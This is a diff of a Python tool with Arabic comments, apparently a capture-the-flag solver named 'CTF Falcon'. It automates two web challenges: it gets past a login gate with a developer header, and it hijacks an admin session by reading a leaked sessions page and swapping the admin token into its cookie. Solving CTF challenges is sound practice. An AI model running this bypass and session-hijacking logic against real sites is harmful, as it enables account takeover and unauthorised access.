+    except ValueError as e:
+        warn.append(f"رُفض الطلب: {e}.")
+        return res
+    except (OSError, http.client.HTTPException) as e:
+        warn.append(f"تعذّر إرسال طلب الدخول: {e}.")
+        return res
+
+    # لا نُظهر كلمة المرور في السجل: نسجّل الاستجابة فقط + ملاحظة عن الترويسة
+    record(r, [f"طلب الدخول عبر {ev['method']} {ev['login_path']} بالترويسة "
+               f"{ev['dev_header']['name']}: {ev['dev_header']['value']}."])
+    res["discovered"] = {
+        "comment_raw": ev["comment_raw"], "comment_decoded": ev["comment_decoded"],
+        "dev_header": ev["dev_header"], "login_path": ev["login_path"],
+        "email_used": email, "response_status": r["status"], "response_content_type": r["content_type"],
+    }
+
+    # قراءة الاستجابة الحقيقية
+    parsed, success_flag, flag = None, None, None
+    flag_response = r
+    try:
+        parsed = json.loads(r["body"])
+    except (json.JSONDecodeError, ValueError):
+        parsed = None
+    if isinstance(parsed, dict):
+        success_flag = parsed.get("success")
+        if isinstance(parsed.get("flag"), str):
+            flag = parsed["flag"]
+    if not flag:
+        flag, _src = extract_flag([("login-response", r["body"])], flag_patterns)
+
+    if not (200 <= r["status"] < 300) or success_flag is False:
+        flag = None
+
+    # تحويل من نفس الأصل؟ نعيد التحقق ونطلب الوجهة مرة واحدة
+    if not flag and r["status"] in (301, 302, 303, 307, 308) and r["location"]:
+        try:
+            r2 = client.request("GET", urljoin(origin, r["location"]))
+            record(r2, ["متابعة تحويل الاستجابة (نفس الأصل) لقراءة العلم."])
+            if 200 <= r2["status"] < 300:
+                flag, _s2 = extract_flag([("redirect-body", r2["body"])], flag_patterns)
+                flag_response = r2
+        except ValueError:
+            warn.append("التحويل كان لمضيف مختلف؛ أُوقف للحفاظ على أصل التحدي.")
+        except (OSError, http.client.HTTPException) as e:
+            warn.append(f"تعذّرت متابعة التحويل: {e}.")
+
+    if flag:
+        res["success"] = True
+        res["flag"] = flag
+        res["flag_source"] = f"HTTP {flag_response['status']} على {flag_response['url']}"
+        expl.append("أعادت الاستجابة الحقيقية العلم بعد تجاوز البوابة بالترويسة.")
+    else:
+        if r["status"] == 401 or success_flag is False:
+            warn.append(f"رفض الخادم الدخول (الحالة {r['status']})؛ لم يُستخرج علم.")
+        elif r["status"] == 404:
+            warn.append(f"مسار الدخول {ev['login_path']} غير موجود (404).")
+        elif success_flag is True:
+            warn.append("نجح الدخول لكن الاستجابة لم تتضمّن علمًا.")
+        else:
+            warn.append(f"استجابة غير متوقعة (الحالة {r['status']})؛ لم يُستخرج علم.")
+        expl.append("لم يُعلَن أي علم لعدم وجود استجابة حقيقية تُثبته.")
+    return res
+
+
+# --------------------------------------------------------------------------- #
+#  محلل Old Sessions (مشروط بالأدلة، وسرد يعكس النتائج الفعلية)                  #
+# --------------------------------------------------------------------------- #
+def solve_old_sessions(client, origin, recon, steps, bodies, record,
+                       flag_patterns, opts) -> dict:
+    res = _base_result(origin, "Old Sessions", "old-sessions", recognized=True)
+    res["steps"] = steps
+    warn = res["warnings"]; expl = res["explanation_ar"]
+    disc = res["discovered"]
+
+    r1 = recon["resp"]  # مُسجَّل مسبقًا كالخطوة 1
+    login_path = r1["location"] or "/login"
+    expl.append(f"الصفحة الرئيسية أنشأت كوكي جلسة وحوّلت إلى {login_path}.")
+
+    def finish():
+        flag, src = extract_flag(bodies, flag_patterns)
+        if flag:
+            res["success"] = True; res["flag"] = flag; res["flag_source"] = src
+        return res
+
+    # (2) /login — مبرَّر بالتحويل
+    try:
+        r2 = client.request("GET", urljoin(origin, login_path))
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        warn.append(f"تعذّر فتح صفحة الدخول: {e}."); return finish()
+    record(r2, ["فحص صفحة الدخول: نتوقع نموذجًا ورابط تسجيل."])
+    if any(c["intent"] == "deletion" for c in analyze_response_cookies(r2)):
+        expl.append("صفحة الدخول حذفت كوكي الجلسة (Max-Age<=0).")
+    if "/register" not in r2["body"]:
+        warn.append("لا يوجد رابط /register في صفحة الدخول؛ تُوقّف المسار عند الدليل المتاح.")
+        return finish()
+
+    # (3) /register — مبرَّر برابط في صفحة الدخول
+    reg_url = urljoin(origin, "/register")
+    r3 = client.request("GET", reg_url)
+    record(r3, ["فحص صفحة التسجيل واكتشاف الحقول."])
+    reg_fields = find_form_fields(r3["body"])
+    disc["register_fields"] = reg_fields
+    if r3["status"] != 200 or not reg_fields:
+        warn.append(f"صفحة /register غير متوقعة (الحالة {r3['status']})؛ توقّف المسار.")
+        return finish()
+
+    username = opts.get("username") or ("falcon_" + secrets.token_hex(4))
+    password = opts.get("password") or secrets.token_hex(8)
+
+    # (اختياري تعليميًا) إثبات أن conf_password مطلوب
+    if opts.get("demonstrate_register_requirement") and "conf_password" in reg_fields:
+        rp = client.request("POST", reg_url, body=urlencode({"username": username, "password": password}))
+        record(rp, ["إثبات المتطلب: تسجيل بدون conf_password — الحالة الفعلية أدناه."])
+        if rp["status"] == 400:
+            expl.append("تأكّد أن conf_password مطلوب (تسجيل ناقص أعاد 400).")
+
+    # (4) تسجيل صحيح بالحقول المكتشفة فقط
+    reg_payload = {"username": username, "password": password}
+    if "conf_password" in reg_fields:
+        reg_payload["conf_password"] = password
+    r4 = client.request("POST", reg_url, body=urlencode(reg_payload))
+    record(r4, ["تسجيل حساب تجريبي بالحقول المكتشفة."])
+    if r4["status"] not in (200, 302):
+        warn.append(f"فشل التسجيل (الحالة {r4['status']})؛ توقّف المسار.")
+        return finish()
+    expl.append("أنشأنا حسابًا تجريبيًا داخل التحدي.")
+
+    # (5) تسجيل الدخول
+    r5 = client.request("POST", urljoin(origin, "/login"),
+                        body=urlencode({"username": username, "password": password}))
+    record(r5, ["تسجيل الدخول بالحساب التجريبي."])
+    own = client.cookies.get("session")
+    if r5["status"] not in (200, 302) or not own:
+        warn.append(f"تعذّر تسجيل الدخول (الحالة {r5['status']})؛ توقّف المسار.")
+        return finish()
+    disc["own_session_token"] = _mask(own)
+    expl.append("سجّلنا الدخول وحصلنا على كوكي جلسة.")
+
+    # (6) الصفحة الرئيسية بعد الدخول — البحث عن إشارة فعلية
+    r6 = client.request("GET", origin)
+    record(r6, ["الصفحة الرئيسية بعد الدخول: البحث عن إشارة لصفحة مخفية."])
+    hint = find_sessions_hint(r6["body"])
+    if not hint:
+        warn.append("لم تظهر إشارة إلى صفحة جلسات؛ توقّف المسار.")
+        return finish()
+    disc["sessions_hint"] = hint
+    expl.append(f"الصفحة كشفت إشارة إلى {hint}.")
+
+    # (7) /sessions — مبرَّر بالإشارة
+    sess_url = urljoin(origin, hint)
+    r7 = client.request("GET", sess_url)
+    record(r7, [f"طلب {hint}: نتوقع تسريب جلسات الخادم."])
+    disc["sessions_url"] = sess_url
+    if r7["status"] != 200:
+        warn.append(f"صفحة {hint} غير متاحة (الحالة {r7['status']})؛ توقّف المسار.")
+        return finish()
+    entries = parse_sessions_dump(r7["body"])
+    disc["sessions_count"] = len(entries)
+    admin = pick_admin_entry(entries, own)
+    expl.append(f"صفحة {hint} سرّبت {len(entries)} جلسة خادم.")
+    if not admin:
+        warn.append("لم يتحدد رمز جلسة المشرف من التسريب.")
+        return finish()
+    disc["admin_session_token"] = admin["token"]      # أداة الاستغلال (لا تُعرض في واجهة السجل)
+    disc["admin_session_decoded"] = admin["decoded"]
+
+    # (8) انتحال جلسة المشرف
+    client.cookies["session"] = admin["token"]
+    r8 = client.request("GET", origin)
+    record(r8, ["انتحال جلسة المشرف: ضبط كوكي session على الرمز المسرّب ثم طلب /."])
+    expl.append("استبدلنا كوكي جلستنا برمز جلسة المشرف المسرّب.")
+
+    out = finish()
+    if out["success"]:
+        expl.append("استُخرج العلم بصفة مشرف.")
+    else:
+        warn.append("لم يظهر علم بعد الانتحال؛ راجِع الأدلة.")
+    return out
+
+
+# --------------------------------------------------------------------------- #
+#  نتيجة "غير معروف"                                                            #
+# --------------------------------------------------------------------------- #
+def unrecognized_result(origin, recon, steps) -> dict:
+    res = _base_result(origin, "غير معروف", "none", recognized=False)
+    res["steps"] = steps
+    res["explanation_ar"].append("لم يتعرف صقر على نمط التحدي من أدلة الصفحة الحالية.")
+    res["discovered"] = {
+        "status": recon["resp"]["status"],
+        "comments": [c["raw"] for c in recon["decoded_comments"]][:5],
+        "decoded_comments": [c["rot13"] for c in recon["decoded_comments"]][:5],
+        "emails": recon["emails"][:5],
+        "forms": recon["forms"][:5],
+        "login_fetch": recon["login_fetch"],
+    }
+    res["warnings"].append("لم يُنفَّذ أي مسار تلقائي (لا Old Sessions ولا غيره).")
+    return res
+
+
+# --------------------------------------------------------------------------- #
+#  الموزِّع الرئيسي                                                              #
+# --------------------------------------------------------------------------- #
+def run_audit(url: str,
+              flag_patterns: list[str] | None = None,
+              timeout: int = DEFAULT_TIMEOUT,
+              insecure_tls: bool = False,
+              demonstrate_register_requirement: bool = False,
+              username: str | None = None,
+              password: str | None = None,
+              email: str | None = None) -> dict:
+    flag_patterns = flag_patterns or DEFAULT_FLAG_PATTERNS
+    if not re.match(r"^https?://", url, re.I):
+        url = "http://" + url
+    p = urlsplit(url)
+    origin = f"{p.scheme}://{p.netloc}/"
+
+    opts = {
+        "demonstrate_register_requirement": demonstrate_register_requirement,
+        "username": username, "password": password, "email": email,
+    }
+
+    client = HttpClient(timeout=timeout, insecure_tls=insecure_tls)
+    steps: list[dict] = []
+    bodies: list[tuple[str, str]] = []
+    record = _make_recorder(client, steps, bodies)
+
+    # فحص أولي
+    try:
+        recon = do_recon(client, origin, record)
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res = _base_result(origin, "غير معروف", "none", recognized=False)
+        res["steps"] = steps
+        res["warnings"].append(f"تعذّر الوصول إلى الهدف: {e}. تحقّق من أن رابط الـ Instance فعّال.")
+        res["explanation_ar"].append("لم يكتمل الفحص الأولي.")
+        return res
+
+    # اختيار المحلل حسب الأدلة فقط
+    cg = detect_crack_the_gate(recon)
+    if cg:
+        return solve_crack_the_gate(client, origin, recon, cg, steps, bodies, record, flag_patterns, opts)
+
+    if detect_old_sessions(recon):
+        return solve_old_sessions(client, origin, recon, steps, bodies, record, flag_patterns, opts)
+
+    return unrecognized_result(origin, recon, steps)
 
 
 # --------------------------------------------------------------------------- #
@@ -528,38 +752,32 @@ def run_audit(url: str,
 def _main(argv: list[str]) -> int:
     if len(argv) < 2 or argv[1] in ("-h", "--help"):
         print("Usage: python web_session_audit.py <instance-url> [--json]")
-        print("مثال: python web_session_audit.py http://host:port/")
         return 0
     url = argv[1]
     as_json = "--json" in argv[2:]
     try:
         result = run_audit(url)
     except (OSError, http.client.HTTPException) as e:
-        print(f"[خطأ اتصال] تعذّر الوصول إلى {url}: {e}", file=sys.stderr)
-        print("تحقّق من أن رابط الـ Instance ما زال فعّالًا.", file=sys.stderr)
+        print(f"[خطأ اتصال] {url}: {e}", file=sys.stderr)
         return 2
 
     if as_json:
         print(json.dumps(result, ensure_ascii=False, indent=2))
         return 0 if result["success"] else 1
 
-    # عرض عربي مبسّط للطالب
     print("=" * 68)
     print(f"CTF Falcon — Web Session Audit v{result['version']}")
-    print(f"التحدي : {result['challenge']}")
-    print(f"الهدف  : {result['target']}")
+    print(f"نوع التحدي : {result['challenge']}  (المحلل: {result['analyzer']})")
+    print(f"الهدف      : {result['target']}")
     print("=" * 68)
     for s in result["steps"]:
         loc = f"  ->  {s['location']}" if s["location"] else ""
         print(f"\n[{s['n']}] {s['method']} {urlsplit(s['url']).path}  =>  {s['status']} {s['reason']}{loc}")
         for c in s["set_cookies"]:
             print(f"    Set-Cookie: {c['name']}  [{c['intent']}]")
-            for note in c["notes_ar"]:
-                print(f"      - {note}")
         for note in s["notes_ar"]:
             print(f"    • {note}")
-    print("\n" + "-" * 68)
-    print("الشرح:")
+    print("\n" + "-" * 68 + "\nالشرح:")
     for line in result["explanation_ar"]:
         print("  " + line)
     if result["warnings"]:
@@ -568,10 +786,11 @@ def _main(argv: list[str]) -> int:
             print("  ! " + w)
     print("-" * 68)
     if result["success"]:
-        print(f"\n✅ العلم: {result['flag']}   (المصدر: {result['flag_source']})")
-        print("انسخ العلم بنفسك إلى منصة المسابقة.")
+        print(f"\n✅ العلم: {result['flag']}   (المصدر: {result['flag_source']})\nانسخ العلم بنفسك.")
+    elif not result["recognized"]:
+        print("\nℹ️ لم يتعرف صقر على نمط التحدي؛ المكتشفات معروضة أعلاه.")
     else:
-        print("\n❌ لم يُستخرج العلم تلقائيًا. راجِع الخطوات أعلاه والأدلة.")
+        print("\n❌ لم يُستخرج العلم. راجِع الأدلة أعلاه.")
     print("=" * 68)
     return 0 if result["success"] else 1
 
